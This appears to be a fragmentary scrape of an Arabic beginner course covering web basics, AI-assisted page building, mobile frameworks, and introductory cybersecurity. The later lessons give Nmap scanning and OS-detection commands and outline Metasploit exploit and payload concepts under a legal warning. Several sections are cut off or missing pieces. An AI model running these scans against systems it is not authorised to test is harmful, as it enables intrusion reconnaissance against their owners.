الدرس الأول: كيف يعمل الإنترنت والمواقع

قبل أن تبني موقعك الأوّل، من المهمّ أن تفهم ما يحدث خلف الكواليس: الإنترنت، الخوادم، DNS، وبروتوكولا HTTP و HTTPS. هذا الفهم البسيط سيجعل كلّ ما يأتي بعده أوضح وأسهل.

ما هو الإنترنت؟

الإنترنت شبكة ضخمة من الحواسيب المتّصلة ببعضها حول العالم عبر كابلات وأسلاك وإشارات لاسلكية. تخيّل أنّ كلّ حاسوب منزل، والكابلات هي الطرق التي تربط هذه المنازل ببعضها.

وعندما تكتب عنوان موقع في متصفّحك، يرسل جهازك طلباً عبر هذه الشبكة إلى حاسوب آخر في مكان ما في العالم يُسمّى الخادم (Server)، فيردّ عليك ذلك الخادم بمحتوى الصفحة.

ما هو الموقع الإلكتروني؟

الموقع مجموعة ملفّات (HTML و CSS و JavaScript وصور...) مخزّنة على خادم متّصل بالإنترنت على مدار الساعة. وعندما يطلبه شخصٌ ما، يرسل الخادم هذه الملفّات إلى متصفّحه، فيعرضها المتصفّح صفحةً جميلة.

الفرق بين الموقع والتطبيق: الموقع ملفّات تُعرض داخل المتصفّح، أمّا التطبيق فيُحمَّل ويعمل على جهازك مباشرة. لكنّ الفرق بينهما بدأ يضيق كثيراً اليوم.

كيف يصل المتصفّح إلى الموقع؟ — رحلة الطلب

  • تكتب العنوان في المتصفّح: مثل google.com — وهذا ما يُسمّى URL أو عنوان الموقع.
  • DNS يترجم الاسم إلى رقم IP: الحواسيب لا تفهم "google.com"، بل تفهم أرقاماً مثل 142.250.185.14. الـ DNS هو دليل الهاتف الذي يترجم الاسم إلى رقم.
  • المتصفّح يرسل طلب HTTP: يقول للخادم: "أعطني محتوى الصفحة الرئيسية من فضلك." ويُسمّى هذا الطلب HTTP Request.
  • الخادم يردّ بمحتوى الصفحة: يرسل ملفّ HTML وكلّ الملفّات المرتبطة به. ويُسمّى هذا الردّ HTTP Response.
  • المتصفّح يعرض الصفحة: يقرأ ملفّ HTML ويرسم الصفحة أمامك خلال ثوانٍ.

HTTP و HTTPS — ما الفرق؟

البروتوكول المعنى الاستخدام
HTTP HyperText Transfer Protocol نقل البيانات بدون تشفير — غير آمن
HTTPS HTTP + Secure نفس الشيء لكن البيانات مشفّرة — آمن

اليوم كلّ المواقع الجادّة تستخدم HTTPS. وإذا رأيت قفلاً صغيراً في شريط المتصفّح فهذا يعني أنّ الاتّصال مشفّر وآمن.

ما هو الخادم (Server)؟

الخادم حاسوبٌ عاديّ مثل حاسوبك تماماً، لكنّه يعمل ٢٤ ساعة ومتّصل بالإنترنت بسرعة عالية، ومهمّته أن يستقبل الطلبات ويرسل الردود. الفرق الوحيد أنّه لا يُغلق أبداً.

شركات مثل Netlify و Vercel و GitHub Pages توفّر لك هذه الخوادم بسعر رخيص أو مجّاناً لتنشر مواقعك عليها.

خلاصة الدرس

  • الإنترنت شبكة حواسيب متّصلة تتواصل عبر الكابلات والإشارات.
  • الموقع ملفّات مخزّنة على خادمٍ يرسلها عند الطلب.
  • DNS يترجم أسماء المواقع إلى أرقام IP يفهمها الحاسوب.
  • HTTP لغة التواصل بين المتصفّح والخادم.
  • HTTPS هو HTTP مع تشفير — أكثر أماناً.

الدرس الثاني: أساسيات HTML و CSS و JavaScript

هذه هي اللبنات الثلاث التي يُبنى منها كلّ موقع على الإنترنت. سنشرح كلّ واحدة منها شرحاً عمليّاً بالأمثلة حتى تفهم دورها بوضوح.

ثلاثة ملفّات تبني كلّ موقع

كلّ موقع تراه على الإنترنت مبنيّ من ثلاثة عناصر أساسية:

العنصر المثال في الحياة دوره في الموقع
HTML هيكل البناء والجدران يُحدّد المحتوى: نصوص، صور، روابط، أزرار
CSS الدهان والديكور يُحدّد الشكل: ألوان، خطوط، مسافات، تصميم
JavaScript الكهرباء والحركة يُضيف التفاعل: النقر، الحركة، الطلبات الديناميكية

HTML — هيكل الصفحة

HTML لغة ترميز تستخدم وسوماً (Tags) لتعريف المحتوى. لكلّ وسم فتحٌ وإغلاق، والمحتوى يوضع بينهما.

HTML
<!-- هذا هيكل صفحة HTML بسيطة -->
<!DOCTYPE html>
<html>
  <head>
    <title>اسم الموقع</title>
  </head>
  <body>

    <h1>عنوان رئيسي</h1>
    <p>هذا نص عادي داخل فقرة.</p>
    <a href="https://google.com">رابط لجوجل</a>
    <img src="صورة.jpg" alt="وصف الصورة">
    <button>اضغط هنا</button>

  </body>
</html>

أكثر الوسوم استخداماً: h1–h6 للعناوين، و p للفقرات، و div لتجميع العناصر، و a للروابط، و img للصور، و button للأزرار.

CSS — التصميم والمظهر

CSS تعمل بتحديد عنصر HTML ثمّ تعريف خصائص له. والصيغة دائماً: اسم العنصر، ثمّ قوسان معقوفان، ثمّ الخصائص بداخلهما.

CSS
/* تنسيق العنوان الرئيسي */
h1 {
  color: #00e676;       /* لون النص */
  font-size: 32px;    /* حجم الخط */
  font-weight: bold;   /* نص عريض */
  text-align: center; /* توسيط */
}

/* تنسيق زر */
button {
  background: #00e676;
  color: #000;
  padding: 12px 24px;
  border: none;
  border-radius: 8px;
  cursor: pointer;
}

وتربط ملفّ CSS بصفحة HTML بوضع هذا السطر داخل <head>:

HTML
<link rel="stylesheet" href="style.css">

JavaScript — التفاعل والحركة

JavaScript لغة برمجة حقيقية تعمل داخل المتصفّح. بها تغيّر الصفحة بعد تحميلها، وتتفاعل مع النقرات، وترسل طلبات للخادم دون إعادة تحميل الصفحة.

JavaScript
// عند النقر على الزر، يظهر رسالة
document.querySelector('button')
  .addEventListener('click', function() {
    alert('مرحباً بك في موقعنا!');
  });

// تغيير نص عنصر
document.querySelector('h1').textContent = 'نص جديد';

// إخفاء وإظهار عنصر
document.querySelector('.menu').style.display = 'none';

وتربط JavaScript بصفحتك عبر:

HTML
<script src="script.js"></script>

تطبيق عمليّ — صفحة كاملة بسيطة

إليك مثالاً حيّاً يجمع الثلاثة معاً في ملفّ واحد:

HTML
<!DOCTYPE html>
<html>
<head>
  <title>صفحتي الأولى</title>
  <style>
    body { background: #111; color: #fff; text-align: center; padding: 40px; }
    button { background: #00e676; padding: 12px 28px; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; }
  </style>
</head>
<body>
  <h1 id="title">مرحباً بك</h1>
  <button onclick="changeName()">غيّر العنوان</button>
  <script>
    function changeName() {
      document.getElementById('title').textContent = 'تم التغيير!';
    }
  </script>
</body>
</html>
انسخ هذا الكود في ملفّ باسم index.html وافتحه في المتصفّح — ستحصل على صفحة تعمل فعليّاً على جهازك بدون إنترنت.

خلاصة الدرس

  • HTML يبني هيكل الصفحة بالوسوم مثل h1 و p و div و a.
  • CSS يُنسّق الشكل: ألوان وخطوط ومسافات وحدود.
  • JavaScript يُضيف التفاعل والحركة وتغيير المحتوى ديناميكيّاً.
  • الثلاثة معاً يبنون أيّ موقع تراه على الإنترنت اليوم.
  • يمكنك كتابة الثلاثة في ملفّ HTML واحد وفتحه في المتصفّح مباشرة.

الدرس الأول: مدخل إلى بناء المواقع

أهلاً بك في أوّل خطوة نحو احتراف بناء المواقع. في هذا الدرس سنبدأ من الصفر تماماً — لا يهمّ إن كنت لم تكتب سطر كود في حياتك، فسنشرح كلّ شيء بهدوء وبالتفصيل.

فلسفة هذه الدورة: سنتعلّم البناء بمساعدة الذكاء الاصطناعي (Claude)، لكنّ هدفنا أن تفهم ما تبنيه لا أن تنسخ دون وعي. الذكاء الاصطناعي رفيقٌ يأخذ بيدك ويسرّع تعلّمك، لكنّ الفهم يبقى لك أنت.

ماذا ستتعلّم في هذا الدرس؟

  • إنشاء حساب على Claude والبدء في استخدامه.
  • فهم ما هو الموقع الإلكتروني وممّ يتكوّن.
  • ترتيب ملفّات مشروعك بشكل احترافيّ.
  • بناء أوّل صفحة ويب لك بمساعدة الذكاء الاصطناعي.
  • قراءة الكود وفهمه وتعديله بنفسك.

أولاً: ما هو Claude وكيف تنشئ حساباً؟

Claude برنامج ذكاء اصطناعيّ يفهم لغتك ويحاورك، ويكتب لك الأكواد ويشرحها. هو أداتك طوال هذه الدورة، وإنشاء الحساب فيه بسيط ومجانيّ:

  • افتح متصفّحك (مثل Chrome) واذهب إلى claude.ai.
  • اضغط زرّ التسجيل Sign up.
  • أنشئ حسابك ببريدك الإلكترونيّ أو بحساب Google.
  • بعد الدخول ستجد مربّع كتابة — هنا تكتب طلباتك.
النسخة المجانية كافية تماماً لكلّ تمارين هذه الدورة، فلا حاجة لأيّ اشتراك مدفوع للبدء.

ثانياً: ما هو الموقع الإلكتروني؟

الموقع في حقيقته مجموعة ملفّات تُحفظ على جهاز قويّ متّصل بالإنترنت دائماً يُسمّى السيرفر. وعندما يكتب أحدٌ عنوان موقعك، يطلب متصفّحه هذه الملفّات ويعرضها له صفحةً جميلة. وكلّ موقع يتكوّن من ثلاثة عناصر، تخيّلها كأنّك تبني إنساناً:

CSSالتصميم والألوان والجمال.الملابس والمظهر.
JavaScriptالحركة والتفاعل.العضلات.

رابعاً: كيف تطلب من Claude أن يبني لك موقعاً؟

جودة ما يعطيك Claude تعتمد على جودة وصفك. لاحظ الفرق:

القاعدة الذهبية: صِف ما تريد كأنّك تشرحه لصديق — ما نوع الصفحة؟ ماذا تحتوي؟ ما ألوانها؟ كلّما زادت التفاصيل، تحسّنت النتيجة.

خامساً: لنبنِ أوّل صفحة لك الآن

افتح Claude وأرسل له هذا الطلب بالضبط:

انسخ هذا الطلب وأرسله لـ Claude

— قسم رئيسيّ فيه عنوان ترحيبيّ كبير ونصّ تعريفيّ وزرّ "تعرّف عليّ أكثر".

اجعل التصميم بسيطاً وأنيقاً، بخلفية بيضاء ونصوص داكنة، مناسباً للهاتف والحاسوب، وضَع CSS داخل نفس الملفّ.

ثمّ ضع الكود في ملفّ لتراه يعمل: على الهاتف استخدم تطبيق Acode، وعلى الحاسوب استخدم VS Code مع إضافة Live Server.

سادساً: افهم الكود، لا تكتفِ بنسخه

عندما يعطيك Claude الكود، لا تنسخه وترحل. اقرأه واسأله عمّا لا تفهمه:

— "كيف أغيّر لون الزرّ إلى الأزرق؟"

هكذا تتعلّم وتبني معاً، وتتحوّل من ناسخٍ للكود إلى فاهمٍ متحكّمٍ فيه.

خلاصة الدرس

  • Claude أداتك الأساسية، والنسخة المجانية تكفيك.
  • كلّ موقع = HTML (هيكل) + CSS (تصميم) + JavaScript (تفاعل).
  • رتّب ملفّاتك قبل أن تبدأ.
  • الوصف الواضح لـ Claude = نتيجة احترافية.
  • افهم الكود ولا تكتفِ بنسخه.

الدرس الثاني: أساسيات HTML — هيكل الصفحة

في الدرس السابق فهمنا أنّ HTML هو هيكل الموقع وعظامه. واليوم نغوص في تفاصيله: كيف يُكتب، وما العلامات التي تبني بها أيّ صفحة. لا تقلق، سنشرح كلّ شيء ببساطة وخطوة بخطوة.

ماذا ستتعلّم في هذا الدرس؟

  • كيف تعمل لغة HTML ونظام "العلامات".
  • أهمّ العلامات التي ستحتاجها في كلّ موقع.
  • الهيكل الثابت الذي تبدأ به كلّ صفحة.
  • كيف تربط صفحات موقعك ببعضها.

أولاً: كيف تعمل HTML؟

تعمل HTML بنظام العلامات (Tags). والعلامة أشبه بصندوق له بداية ونهاية: علامة فتح تقول "ابدأ هنا"، وعلامة إغلاق تقول "انتهِ هنا"، وبينهما يوضع المحتوى:

HTML
<h1>هذا عنوان كبير</h1>
<p>هذه فقرة نصّية عادية</p>
<a href="page.html">هذا رابط</a>

لاحظت العلامة المائلة / في الإغلاق؟ هي التي تفرّق بين الفتح <h1> والإغلاق </h1>.

ثالثاً: الهيكل الثابت لأيّ صفحة

كلّ صفحة ويب في العالم تبدأ بهذا الهيكل الأساسيّ. احفظه جيّداً، فهو نقطة انطلاق أيّ موقع:

index.html
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>اسم الصفحة</title>
</head>
<body>

  <!-- محتوى صفحتك هنا -->

</body>
</html>

ولنفهم كلّ سطر:

  • lang="ar" — تخبر المتصفّح أنّ لغة الصفحة عربية.
  • dir="rtl" — تجعل الكتابة من اليمين لليسار (مهمّة للعربية).
  • charset="UTF-8" — تضمن ظهور الحروف العربية بلا رموز غريبة.
  • viewport — تجعل موقعك يتكيّف مع شاشة الهاتف.
  • title — الاسم الذي يظهر في تبويب المتصفّح.

الدرس الثالث: التصميم بـ CSS

تعلّمنا كيف نبني هيكل الصفحة بـ HTML. لكنّ الهيكل وحده يبدو باهتاً — أبيض وأسود ونصوص مرصوصة. هنا يأتي دور CSS، اللغة التي تُلبس موقعك حُلّته الجميلة: الألوان والخطوط والمسافات والتنسيق.

ماذا ستتعلّم في هذا الدرس؟

  • كيف تعمل لغة CSS وما فلسفتها.
  • أهمّ خصائص التصميم التي ستستخدمها باستمرار.
  • كيف تجعل موقعك احترافياً على الهاتف والحاسوب.
  • كيف تستعين بـ Claude لتصميم واجهات جميلة.

أولاً: كيف يعمل CSS؟

يعمل CSS بقاعدة من ثلاثة أجزاء: المُحدِّد (أيّ عنصر؟)، ثمّ الخاصيّة (ماذا نغيّر؟)، ثمّ القيمة (ما المقدار؟):

CSS
h1 {
  color: #333333;        /* لون النصّ */
  font-size: 2rem;       /* حجم الخطّ */
  text-align: center;    /* محاذاة في الوسط */
}

اقرأها هكذا: "خُذ كلّ عنوان h1، واجعل لونه رمادياً داكناً، وحجمه كبيراً، ومحاذاته في الوسط".

ثانياً: أهمّ الخصائص

الخاصيّةوظيفتها
colorلون النصّ.
background-colorلون الخلفية.
font-sizeحجم الخطّ.
paddingالمسافة الداخلية بين العنصر ومحتواه.
marginالمسافة الخارجية بين العنصر وما حوله.
border-radiusتدوير زوايا العنصر.
text-alignمحاذاة النصّ.
display: flexترتيب العناصر بجانب بعضها بمرونة.
الفرق بين padding وmargin: تخيّل العنصر صورةً في إطار. الـpadding هو المسافة داخل الإطار، والـmargin هو المسافة خارجه (بينه وبين غيره).

ثالثاً: نظام الألوان

الألوان تُكتب غالباً بصيغة HEX، رمز يبدأ بـ# يتبعه ستّة رموز:

CSS
color: #FFFFFF;   /* أبيض */
color: #000000;   /* أسود */
color: #2EA043;   /* أخضر */
color: #1B6CA8;   /* أزرق */
color: #333333;   /* رمادي داكن مريح للقراءة */

لا داعي لحفظها — اطلب من Claude أيّ لون بالاسم وهو يعطيك رمزه.

رابعاً: اجعل موقعك مناسباً للهاتف

أكثر من نصف الزوّار يتصفّحون من هواتفهم. الأسلوب الأفضل يُسمّى Mobile-First: نصمّم للهاتف، ثمّ نضيف تعديلات للشاشات الكبيرة عبر media query:

CSS
/* الأساس — للهاتف */
.container {
  width: 100%;
  padding: 0 16px;
}

/* تعديلات للشاشات الكبيرة فقط */
@media (min-width: 768px) {
  .container {
    max-width: 1200px;
    margin: 0 auto;
  }
}

الدرس الأول: كيف تعمل تطبيقات الهواتف؟

Android وiOS، الفرق بين أنواع التطبيقات، وكيف يصل التطبيق إلى هاتفك

أولاً: هاتفك فيه نظامان مختلفان تماماً

عندما نتحدث عن تطبيقات الهواتف، أول شيء يجب أن تعرفه هو أن هناك نظامَي تشغيل رئيسيَّين يعملان على هواتف اليوم:

النظام من يصنعه؟ على أي هواتف؟ لغة البرمجة الأصلية
Android Google Samsung، Xiaomi، Huawei، وغيرها Kotlin أو Java
iOS Apple iPhone فقط Swift أو Objective-C

يعني إذا أردت قديماً أن تبني تطبيقاً يعمل على الاثنين، كان عليك تعلّم لغتين مختلفتين وكتابة الكود مرتين. هذا كان مكلفاً ومتعباً — ولهذا ظهرت حلول جديدة سنتحدث عنها لاحقاً.

ثانياً: ليست كل التطبيقات متشابهة

عندما تفتح هاتفك، التطبيقات التي تراها لا تعمل كلها بنفس الطريقة. هناك ثلاثة أنواع:

  • التطبيق الأصلي (Native App): مبني خصيصاً لنظام معين بلغته الأصلية. مثلاً تطبيق الكاميرا في iPhone مبني بـ Swift لنظام iOS فقط. هذا النوع أسرع وأكثر سلاسة لأنه يتواصل مباشرة مع نظام الهاتف بدون وسيط.
  • تطبيق الويب (Web App): ليس تطبيقاً حقيقياً في الأصل — هو موقع إلكتروني تفتحه من المتصفح لكنه يبدو كتطبيق. مثال: لو فتحت Twitter من Chrome بدل تطبيقه، هذا تطبيق ويب. ميزته: تكتبه مرة واحدة ويعمل على كل شيء. عيبه: لا يصل لكل ميزات الهاتف مثل البلوتوث أو الكاميرا بشكل كامل.
  • التطبيق الهجين (Cross-Platform App): الحل الوسط الذكي. تكتب الكود مرة واحدة وينتج تطبيقَين: واحد لـ Android وواحد لـ iOS. هذا ما تفعله Flutter وReact Native. وهذا ما ستتعلمه في هذا المسار.
معظم التطبيقات الكبيرة اليوم مثل Airbnb وFacebook وAlibaba تستخدم تطبيقات هجينة لتوفير الوقت والمال. الجودة أصبحت قريبة جداً من التطبيقات الأصلية.

ثالثاً: كيف يصل التطبيق إلى هاتفك؟

عندما تبني تطبيقاً، لا يمكنك إرساله مباشرة للناس كملف. هناك رحلة يمر بها التطبيق قبل أن يصل لهاتف المستخدم:

  • المطوّر يكتب الكود: تكتب الكود على حاسوبك باستخدام محرر نصوص خاص يُسمى IDE مثل Android Studio أو VS Code.
  • البناء والتحويل (Build): الحاسوب يحوّل الكود الذي كتبته إلى ملف تطبيق. في Android يكون الملف بصيغة APK وفي iOS يكون IPA.
  • الرفع إلى المتجر: ترفع الملف إلى Google Play Store لـ Android أو App Store لـ iOS. يراجعه فريق المتجر أولاً قبل النشر.
  • المستخدم يحمّله: يبحث عن التطبيق في المتجر، يضغط تثبيت، والمتجر يرسله إلى هاتفه.

رابعاً: ما الذي يستطيع التطبيق الوصول إليه في هاتفك؟

التطبيق ليس مجرد شاشة — يمكنه التواصل مع أجزاء هاتفك المختلفة. هذه الأجزاء تُسمى APIs الهاتف، ومنها:

الميزة مثال على استخدامها
الكاميرا تطبيق Instagram يلتقط صورك
GPS والموقع Uber يعرف أين أنت
الإشعارات WhatsApp يرسل لك تنبيهاً برسالة جديدة
الميكروفون تطبيق المكالمات يسمع صوتك
التخزين تطبيق الموسيقى يحفظ الأغاني
البلوتوث تطبيق السماعات يتصل بسماعتك

كل هذه الميزات تحتاج إذن من المستخدم — لهذا عندما تثبت تطبيقاً جديداً يسألك "هل تسمح للتطبيق بالوصول إلى الكاميرا؟".

  • التطبيقات ثلاثة أنواع: أصلية، ويب، وهجينة — والهجينة هي ما ستتعلمه
  • التطبيق الهجين يُكتب مرة واحدة ويعمل على Android وiOS معاً

الدرس الثاني: Flutter أم React Native؟ — دليل الاختيار الكامل

شرح كل منهما من الصفر، مقارنة شاملة، وكيف تقرر أيهما تتعلم

أولاً: ما المشكلة التي حلّاها؟

كما تعلمت في الدرس الأول، بناء تطبيق لـ Android وiOS قديماً كان يعني كتابة كودَين كاملَين بلغتَين مختلفتَين. هذا يعني ضعف العمل وضعف التكلفة.

الحل الذكي الذي ظهر هو: إطار عمل واحد تكتب فيه كودك مرة واحدة، وهو يتولى تحويله إلى تطبيق يعمل على الجهازَين. هذا بالضبط ما يفعله Flutter وReact Native.

تخيّل أنك تكتب رسالة بالعربية، ثم يأتي مترجم ذكي ويترجمها للإنجليزية والفرنسية تلقائياً. Flutter وReact Native يفعلان نفس الشيء مع كودك.

ثانياً: ما هو Flutter؟ — شرح من الصفر

Flutter هو إطار عمل صنعته شركة Google عام 2018. تكتب فيه بلغة اسمها Dart — لغة صنعتها Google أيضاً، مصممة لتكون سهلة وسريعة.

الفكرة الذكية في Flutter هي أنه لا يستخدم أزرار وعناصر Android أو iPhone الأصلية. بدلاً من ذلك، يرسم كل شيء بنفسه كأنه لعبة فيديو. يعني هو يتحكم في كل بكسل تراه على الشاشة.

كيف يبدو كود Flutter؟

Dart
// مثال بسيط: شاشة تعرض نص وزر

import 'package:flutter/material.dart';

void main() {
  runApp(MyApp());
}

class MyApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      home: Scaffold(
        body: Center(
          child: Column(
            children: [
              Text('مرحباً بك في تطبيقي'),
              ElevatedButton(
                onPressed: () {},
                child: Text('اضغط هنا'),
              ),
            ],
          ),
        ),
      ),
    );
  }
}

لاحظ كلمة Widget — هذا هو القلب في Flutter. كل شيء في Flutter يُسمى Widget: النص widget، الزر widget، حتى الصفحة الكاملة widget. تبني التطبيق بتركيب هذه الـ Widgets فوق بعضها مثل مكعبات Lego.

ثالثاً: ما هو React Native؟ — شرح من الصفر

React Native هو إطار عمل صنعته شركة Facebook (Meta) عام 2015. تكتب فيه بلغة JavaScript — نفس اللغة المستخدمة في مواقع الإنترنت التي درستها في مسار المواقع.

الفكرة مختلفة عن Flutter. React Native لا يرسم الشاشة بنفسه — بل يقول لنظام الهاتف: "أنا أريد زراً هنا ونصاً هنا" والنظام يرسم زره الأصلي هو. يعني المستخدم يرى عناصر تبدو وكأنها مبنية لنظامه تحديداً.

كيف يبدو كود React Native؟

JavaScript
// مثال بسيط: شاشة تعرض نص وزر

import React from 'react';
import { View, Text, Button } from 'react-native';

export default function App() {
  return (
    <View>
      <Text>مرحباً بك في تطبيقي</Text>
      <Button
        title="اضغط هنا"
        onPress={() => {}}
      />
    </View>
  );
}

لاحظ أن الكود يشبه HTML كثيراً — هذا ليس صدفة. React Native مصمم ليكون مريحاً لمن يعرف تطوير مواقع الإنترنت. إذا تعلمت مسار المواقع أولاً، React Native سيكون أسهل عليك بكثير.

رابعاً: المقارنة الكاملة بينهما

Flutter

  • لغة Dart — مصممة خصيصاً للتطبيقات، سهلة التعلم
  • يرسم كل شيء بنفسه — التطبيق يبدو متطابقاً على كل الهواتف
  • أداء سريع جداً لأنه لا يحتاج وسيط
  • مكتبة Widgets ضخمة جاهزة للاستخدام مباشرة
  • يدعم أيضاً الويب وDesktop بنفس الكود
  • من الصعب بناء تطبيق يبدو "أصلياً" تماماً لكل نظام

React Native

  • لغة JavaScript — نفس لغة مواقع الإنترنت، مجتمع ضخم
  • يستخدم عناصر النظام الأصلية — الزر في iOS يبدو كزر iOS
  • سهل التعلم إذا كنت تعرف React للويب
  • مجتمع أكبر وأقدم، مكتبات أكثر
  • بعض الميزات تحتاج كوداً أصلياً إضافياً
  • الأداء أبطأ قليلاً في التطبيقات الثقيلة

خامساً: أيهما تختار؟ — القرار النهائي

اختر بناءً على وضعك:

Flutter

إذا كنت مبتدئاً تماماً ولا تعرف أي لغة برمجة — Flutter أسهل للبداية لأن Dart لغة نظيفة ومبسّطة وستتعلمها من الصفر بدون عادات قديمة.

React Native

إذا أتممت مسار المواقع وتعرف JavaScript — React Native الخيار الطبيعي لك، ستتعلمه بنصف الوقت لأن 60% منه مألوف لديك.

Flutter

إذا هدفك بناء تطبيق بتصميم مخصص جميل ومتطابق على كل الهواتف — Flutter يمنحك تحكماً كاملاً في كل بكسل.

React Native

إذا تريد الاستفادة من مكتبات ويب موجودة وتريد العمل مع فرق تطوير كبيرة — React Native مجتمعه أضخم وأكثر مكتبات.

الحقيقة المهمة: الاثنان ممتازان ومطلوبان في سوق العمل. القرار ليس بين جيد وسيئ — بل بين أيهما يناسب خلفيتك وهدفك أكثر. اختر وابدأ، لا تنتظر كثيراً.

خلاصة الدرس

  • Flutter وReact Native كلاهما يحلّان نفس المشكلة: كتابة تطبيق يعمل على Android وiOS بكود واحد
  • Flutter يستخدم لغة Dart ويرسم كل شيء بنفسه — ممتاز للتصاميم المخصصة
  • React Native يستخدم JavaScript ويعتمد على عناصر النظام الأصلية — ممتاز لمن يعرف الويب
  • في Flutter كل شيء Widget — تبني التطبيق بتركيب Widgets فوق بعضها
  • في React Native الكود يشبه HTML — مريح لمطوري المواقع
  • إذا كنت مبتدئاً: Flutter. إذا تعرف JavaScript: React Native

أولاً: React Native ببساطة

HTML (مواقع)

React Native (تطبيقات)

<TouchableOpacity>
  <Text>زرّ</Text>
</TouchableOpacity>

ثانياً: ما هو عنوان IP؟

IP تعني Internet Protocol أي بروتوكول الإنترنت.

عنوان IP هو رقم فريد يُعطى لكل جهاز متصل بالشبكة، مثله مثل رقم هاتفك تماماً.

مثال على عنوان IP:

code
192.168.1.100

هذا الرقم مكوّن من أربعة أجزاء مفصولة بنقاط.

كل جزء رقم بين 0 و 255.

1. العنوان الخاص Private IP:

أولاً: ما هو Nmap؟

تخيل أنك في مبنى كبير وتريد أن تعرف:

  • ما الذي يوجد خلف كل باب؟

Nmap يفعل هذا تماماً لكن للشبكات:

  • كم عدد الأجهزة المتصلة؟
  • أي الـ Ports مفتوحة؟
  • ما الخدمات التي تعمل على كل Port؟

تأسس عام 1997 ولا يزال الأداة الأكثر استخداماً في الأمن السيبراني.

الفحص الأبسط - هل الجهاز يعمل؟

code
nmap 192.168.1.1

code
nmap -sV 192.168.1.1

code
sudo nmap -O 192.168.1.1

يحاول معرفة نظام التشغيل على الجهاز الهدف.

الفحص الشامل (الأكثر استخداماً):

code
sudo nmap -sV -O -A 192.168.1.1

فحص Ports محددة:

code
nmap -p 80 192.168.1.1 # فحص Port 80 فقط
nmap -p 80,443,22 192.168.1.1 # فحص Ports محددة
nmap -p 1-1000 192.168.1.1 # فحص أول 1000 Port
nmap -p- 192.168.1.1 # فحص كل الـ 65535 Port

code
nmap -oN نتائج.txt 192.168.1.1 # حفظ بشكل نصي
nmap -oX نتائج.xml 192.168.1.1 # حفظ بشكل XML

أولاً: ما هو Wireshark؟

تخيل أن الشبكة طريق سريع والبيانات سيارات تمر.

Wireshark مثل كاميرا مراقبة على هذا الطريق تسجل كل سيارة تمر وتعطيك تفاصيلها الكاملة.

يلتقط Wireshark كل Packet (حزمة بيانات) تمر عبر شبكتك ويعرضها لك بشكل مفصل.

ما هو الـ Packet؟

البيانات لا تُرسل دفعة واحدة. تُقسَّم لقطع صغيرة تسمى Packets، كل Packet يحتوي على جزء من البيانات + معلومات عن المصدر والوجهة.

ثالثاً: واجهة Wireshark

عند فتح Wireshark ستجد:

1. قائمة واجهات الشبكة:

اختر الواجهة التي تستخدمها (عادة eth0 أو wlan0).

2. شريط الـ Capture Filter:

لتصفية ما تلتقطه قبل البدء.

3. قائمة الـ Packets:

كل Packet في سطر مع معلوماته.

4. تفاصيل الـ Packet:

عند الضغط على Packet معين تجد تفاصيله الكاملة.

أولاً: ما هو Metasploit؟

Metasploit هو إطار عمل متكامل لاختبار الاختراق. يحتوي على آلاف الأدوات والثغرات الجاهزة.

تخيله مثل صندوق أدوات احترافي:

  • بدل أن تبني كل أداة بنفسك
  • Metasploit يعطيك كل شيء جاهزاً

يستخدمه:

  • مختبرو الاختراق المحترفون
  • فرق الأمن في الشركات
  • الباحثون الأمنيون
انسخ هذا الطلب لـ Claude
**تحذير مهم جداً:**
Metasploit أداة قوية جداً. استخدامها على أنظمة بدون إذن صريح من المالك **جريمة يعاقب عليها القانون** في كل دول العالم.
في هذا الدرس ستتدرب فقط على أنظمة مصممة للتدريب مثل Metasploitable.

ثانياً: مفاهيم أساسية في Metasploit

Module: وحدة كود تؤدي مهمة محددة.

Exploit: كود يستغل ثغرة أمنية في نظام ما.

Payload: الكود الذي يُنفَّذ بعد نجاح الاستغلال (مثل فتح نافذة تحكم).

Auxiliary: أدوات مساعدة للفحص والاستكشاف.

Post: أدوات تُستخدم بعد الاختراق لجمع المعلومات.

Loot: المعلومات التي جُمعت بعد الاختراق.

أولاً: مبادئ الأمن السيبراني الثلاثة - CIA

كل الأمن السيبراني يقوم على ثلاثة مبادئ تسمى CIA Triad:

C - Confidentiality (السرية):

فقط من يجب أن يرى البيانات يراها.

مثال: كلمة مرورك لا يجب أن يعرفها أحد غيرك.

I - Integrity (النزاهة):

البيانات لم تُعدَّل من غير المصرح لهم.

مثال: الرسالة التي أرسلتها وصلت كما هي دون تعديل.

A - Availability (التوافر):

الخدمة متاحة للمستخدمين المصرح لهم عند الحاجة.

مثال: موقعك يعمل 24/7 ولا يتوقف بسبب هجوم.

ثانياً: جدار الحماية Firewall

الجدار الناري مثل حارس المبنى. يفحص كل من يدخل ويخرج ويسمح أو يمنع وفق قواعد محددة.

أنواع الجدران النارية:

1. Network Firewall:

يحمي شبكة كاملة. يوضع عادة بين الشبكة الداخلية والإنترنت.

2. Host Firewall:

يحمي جهازاً واحداً. مثل جدار الحماية في Windows أو iptables في Linux.

إعداد Firewall على Linux:

code
# عرض القواعد الحالية
sudo iptables -L

# السماح بـ SSH
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# السماح بـ HTTP و HTTPS
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# منع كل الاتصالات الأخرى
sudo iptables -A INPUT -j DROP

# حفظ القواعد
sudo iptables-save > /etc/iptables/rules.v4

طريقة أسهل - UFW:

code
sudo ufw enable # تفعيل الجدار الناري
sudo ufw allow ssh # السماح بـ SSH
sudo ufw allow 80/tcp # السماح بـ HTTP
sudo ufw deny 3306 # منع MySQL من الخارج
sudo ufw status # عرض الحالة

أولاً: الفرق بين أنواع المخترقين

في عالم الأمن السيبراني يُصنَّف المخترقون إلى ثلاثة أنواع تُعرَّف بألوان القبعات، وهذا التصنيف متعارف عليه دولياً.

القبعة البيضاء - White Hat:

هو المخترق الأخلاقي. يعمل بإذن قانوني كامل من مالك النظام. هدفه إيجاد الثغرات وإبلاغ المالك بها لإصلاحها. يتقاضى راتباً أو أجراً مقابل عمله. هؤلاء هم الذين ستكون عليهم بعد إتمام هذا المسار.

القبعة السوداء - Black Hat:

يخترق الأنظمة بدون إذن وبنية إجرامية. يسرق البيانات أو يطلب فدية أو يبيع المعلومات. يواجه السجن والملاحقة القانونية في كل أنحاء العالم.

القبعة الرمادية - Gray Hat:

